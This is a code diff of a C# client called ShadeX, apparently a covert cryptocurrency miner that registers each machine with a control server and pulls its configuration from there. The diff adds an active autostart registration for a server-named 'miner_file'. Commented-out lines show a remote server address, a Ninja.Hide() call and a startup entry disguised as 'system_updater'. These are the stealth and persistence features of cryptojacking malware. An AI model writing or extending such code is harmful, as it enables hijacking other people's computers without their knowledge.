@@ -5,6 +5,8 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using Console = Colorful.Console;
+using System.Drawing;
 using ShadeX_Core;
 
 namespace ShadeX_Client
@@ -19,13 +21,14 @@ namespace ShadeX_Client
         private static UserInput userInput;
         private static bool firstConnection = true;
         private static bool initDone = false;
+        private static readonly string http_adress = @"http://localhost/";
 
         private static string device_id;
         static void Main(string[] args)
         {
             /* Connection Handler */
             //connectionHandler = new ConnectionHandler(@"http://shadex.5v.pl/");
-            connectionHandler = new ConnectionHandler(@"http://localhost/");
+            connectionHandler = new ConnectionHandler(http_adress);
             connectionHandler.GetConnection += connectionHandler_GetConnection;
             connectionHandler.LoseConnection += connectionHandler_LoseConnection;
 
@@ -46,7 +49,7 @@ namespace ShadeX_Client
 
             /* Hide */
             //Ninja.Hide();
-            //Ninja.AddStartup("system_updater", AppDomain.CurrentDomain.BaseDirectory);
+            
 
             initDone = true;
         }
@@ -73,11 +76,10 @@ namespace ShadeX_Client
         {
             while (!initDone) { Thread.Sleep(100); }
 
-            Console.WriteLine("Connected to server. ");
+            Console.WriteLine("Connected to server : " + http_adress,Color.Yellow);
 
             if(firstConnection)
             {
-                
                 if (device_id == null)
                 {
                     device_id = config.GetValue("device_id");
@@ -87,14 +89,14 @@ namespace ShadeX_Client
                         Random rand = new Random();
                         for (int i = 0; i < 9; i++) { device_id += rand.Next(9); }
                         while (!api.CreateNewDevice(device_id)) { Thread.Sleep(1000); }
-
-                        Console.WriteLine("New Device Created: " + device_id);
+                        Console.WriteLine("New Device Created : " + device_id);
                     }
                 }
                 config.Update(api.GetConfigFile(device_id));
                 config.Update("device_id", device_id);
-
-                Console.WriteLine(device_id);
+                Ninja.AddStartup(config.GetValue("miner_file"), AppDomain.CurrentDomain.BaseDirectory);
+                Console.WriteLine("Device ID : " + device_id,Color.Yellow);
+                firstConnection = false;
             }
 
             miner = new Miner(
